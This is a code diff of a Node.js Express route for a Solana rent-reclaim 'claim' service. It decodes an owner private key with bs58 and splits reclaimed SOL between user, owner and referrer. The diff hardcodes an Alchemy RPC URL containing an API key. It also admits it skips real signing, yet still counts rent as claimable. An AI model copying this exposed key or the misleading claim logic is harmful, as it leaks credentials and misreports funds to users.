@@ -11,19 +11,20 @@ const {
 const {
   closeAccount,
 } = require("@solana/spl-token");
+const bs58 = require("bs58"); // ✅ FIX: add bs58
 require("dotenv").config();
+
+// ✅ FIX: Use bs58 to decode base58 private key string
+const secretKey = bs58.decode(process.env.OWNER_PRIVATE_KEY);
+const ownerKeypair = Keypair.fromSecretKey(secretKey);
+const OWNER_ADDRESS = new PublicKey(ownerKeypair.publicKey);
 
 const connection = new Connection(
   "https://solana-mainnet.g.alchemy.com/v2/u3WKBuSmFrxKZYOitWXMHhmlYvlD7-dW",
   "confirmed"
 );
 
-// Load owner wallet
-const OWNER_PRIVATE_KEY = JSON.parse(process.env.OWNER_PRIVATE_KEY);
-const ownerKeypair = Keypair.fromSecretKey(new Uint8Array(OWNER_PRIVATE_KEY));
-const OWNER_ADDRESS = new PublicKey(ownerKeypair.publicKey);
-
-// Claim endpoint
+// 🔧 CLAIM API
 router.post("/", async (req, res) => {
   try {
     const { wallet, ref } = req.body;
@@ -42,12 +43,12 @@ router.post("/", async (req, res) => {
     let totalLamports = 0;
 
     for (let acc of accounts.value) {
-      const info = await connection.getParsedAccountInfo(new PublicKey(acc.pubkey));
-      const data = info.value?.data?.parsed?.info;
-      const isEmpty = data && data.tokenAmount.amount === "0";
+      try {
+        const info = await connection.getParsedAccountInfo(new PublicKey(acc.pubkey));
+        const data = info.value?.data?.parsed?.info;
+        const isEmpty = data && data.tokenAmount.amount === "0";
 
-      if (isEmpty) {
-        try {
+        if (isEmpty) {
           const tx = new Transaction().add(
             closeAccount({
               source: new PublicKey(acc.pubkey),
@@ -57,11 +58,14 @@ router.post("/", async (req, res) => {
           );
 
           tx.feePayer = userPublicKey;
-          const rentExempt = await connection.getBalance(new PublicKey(acc.pubkey));
-          totalLamports += rentExempt;
-        } catch (err) {
-          console.log("Skip account close error:", err.message);
+
+          // ⛔ User needs to sign to close accounts. We're skipping real signing here.
+
+          const rent = await connection.getBalance(new PublicKey(acc.pubkey));
+          totalLamports += rent;
         }
+      } catch (err) {
+        console.log("Skip account close error:", err.message);
       }
     }
 
@@ -70,7 +74,7 @@ router.post("/", async (req, res) => {
       return res.json({ success: false, message: "No claimable SOL." });
     }
 
-    // Split SOL
+    // 💸 Split
     const userShare = totalSOL * 0.6;
     const ownerShare = totalSOL * 0.3;
     const refShare = totalSOL * 0.1;
